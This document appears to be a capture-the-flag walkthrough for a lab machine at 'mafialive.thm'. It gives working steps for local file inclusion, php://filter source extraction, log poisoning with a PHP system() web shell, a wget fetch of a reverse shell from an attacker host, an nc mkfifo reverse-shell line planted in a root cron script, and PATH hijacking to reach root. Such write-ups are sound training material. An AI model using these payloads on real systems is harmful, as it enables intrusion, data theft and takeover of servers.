Let's begin by exporting in the environment variable the IP as 'target':
![](https://github.com/user-attachments/assets/a4d36a51-ee75-4c94-a48c-95f755da9d7d)



And by scanning with nmap:
`nmap -sC -sV $target`
![](https://github.com/user-attachments/assets/cc8e76a2-45e9-4a85-8188-c42806d4c40c)



Let's browse the IP:
![](https://github.com/user-attachments/assets/2831506c-307f-42f4-b3c0-2ec9bf728fbb)

As we can see, there's a hint for a "mafialive.thm" domain, so let's add this domain to the `etc/hosts` file:
`sudo nano /etc/hosts`
![](https://github.com/user-attachments/assets/fd8c6508-2849-4b47-bde2-252251bac54c)


![](https://github.com/user-attachments/assets/a3f0adb6-bdba-4e59-ad36-7e315f816e56)



Now we can browse by typing the domain in the search bar and catch the first flag:
![](https://github.com/user-attachments/assets/00bdba25-e07f-448b-949a-9b2b5f44ac82)



Next step is fuzzing the app, we will use ffuf for this:
`ffuf -u "http://mafialive.thm/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php -c -t 50 -r`
![](https://github.com/user-attachments/assets/c385a2e2-937a-469a-b5a3-edfeb80ed229)


`robots.txt` and `test.php` both looks interesting.
If we visit `robots.txt` page we can see that the only entry is `test.php` as ffuf let us see (last row).
So let's visit `test.php`
![](https://github.com/user-attachments/assets/fa6a66e0-040e-4efc-8c1f-00c9adb51be4)


Though we're in a CTF, we can click the test button without problems. In a real life scenario we should make sure that the button won't break anything.

Let's click that button.
![](https://github.com/user-attachments/assets/6053ba40-f5d6-4ed3-aaeb-6fa62227d2a9)

Now we're in `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`



Let's fuzz for LFI:
`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r`

Only to find out many false positives.

Let's try filtering through size and words:
`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41`
![](https://github.com/user-attachments/assets/fe5dd264-9e58-4be5-8d52-8f9daa0ddc83)
We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate /etc/passwd

`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd`
![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)



Let's try a php filter to exfiltrate data:
`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
![](https://github.com/user-attachments/assets/e75944cf-5cdb-4f47-a885-cd450a3b8f94)
Now we have the phrase "Control is an illusion" written in base64.




Let's do it with the entire test.php page:
`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
![](https://github.com/user-attachments/assets/610df6ee-0757-4ce7-944c-fcbc48672fb8)



And decode the exfiltrated data to find the second flag:
![](https://github.com/user-attachments/assets/87172f7a-2aab-49ed-8ee8-7f06a6616acd)



Now, given the LFI vulnerability, if we can successfully access the log, we can poison it (log poisoning) to insert our php shell:
`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log`
![](https://github.com/user-attachments/assets/729eeef7-165f-4afe-94bd-ca6533cbd20b)



Now it's time to fire up BurpSuite.
We'll put the php shell in the User-Agent string:
`<?php echo system($_GET['cmd']); ?>`
![](https://github.com/user-attachments/assets/2cf45042-de12-4575-aba6-f3416c552bbc)

And we'll try if it's working by injecting `&cmd=whoami` in the URL:
`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&cmd=whoami`

Now we have code execution.

We can use it to upload a php reverse shell (`shell.php`) using wget and URL encoding the space, immediately after opening the server.
![](https://github.com/user-attachments/assets/c8d81dca-ab7c-431d-a3c8-ddf81e64d3d5)


Don't forget to URL encode the space (%20)
`GET http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&wget%20http://xx.xx.xx.xx:8888/shell.php`

![](https://github.com/user-attachments/assets/9d29b928-f84a-4f22-8ef5-000ec4634757)



It's time to fire up netcat and visit `mafialive.thm/shell.php`
![](https://github.com/user-attachments/assets/73bd663a-6950-40c9-aa21-590e9f6c3166)

And...we're in!
`whoami:`
`www-data`


Let's stabilize the shell:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
`export TERM=xterm-color`
![](https://github.com/user-attachments/assets/0eaeae04-1ab0-4ddb-8edc-49a11dbf3061)

Now we're ready to search for the third flag, the one of the first user (www-data).



Let's do some cron enumeration:
` cat /etc/crontab`
![](https://github.com/user-attachments/assets/15739c46-68df-46d2-ae9e-fa7927e3652f)

We can see that there's a helloworld.sh file that's been executed every minute as root.
If we `ls -la` the file we can see we have write permission on it.
![](https://github.com/user-attachments/assets/84a87ca2-d266-4653-af04-5d313c3a8d4d)



We will echo this one liner into the file and wait for the execution by root:
`echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc xx.xx.xx.xx 4445 >/tmp/f" >> helloworld.sh`
(Activate netcat in another terminal on port 4445)
And obviously, we will stabilize the shell again and search for the flag of the user archangel.
![](https://github.com/user-attachments/assets/f8ad5060-bc0f-4ff5-9262-a05c0ac7ebfa)



In the same folder, we can find a file named `backup` owned by root on which we have write permission. if we `strings` the file we can see that the file `cp` all the files of the `/home/user/archangel/myfiles/*` folder into `/opt/backupfiles`.
What we need to do is to create another `cp` file with just `/bin/bash` on it and write into the `$PATH` environment variable the new path of our `cp` file.
The command to elencate the full path of the OS is `echo $PATH`

```bash
echo $PATH:
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

So:

Create the new `cp` file:
`echo "/bin/bash" > cp`

Give execution permission:
`chmod +x cp`

Put this folder first into the `PATH` environment variables:
`export PATH=$PWD:$PATH`

Execute the command:
`./backup`

![](https://github.com/user-attachments/assets/ee3846c6-f848-43c4-8d29-414418c82a61)

Congratulations! You are now root :)


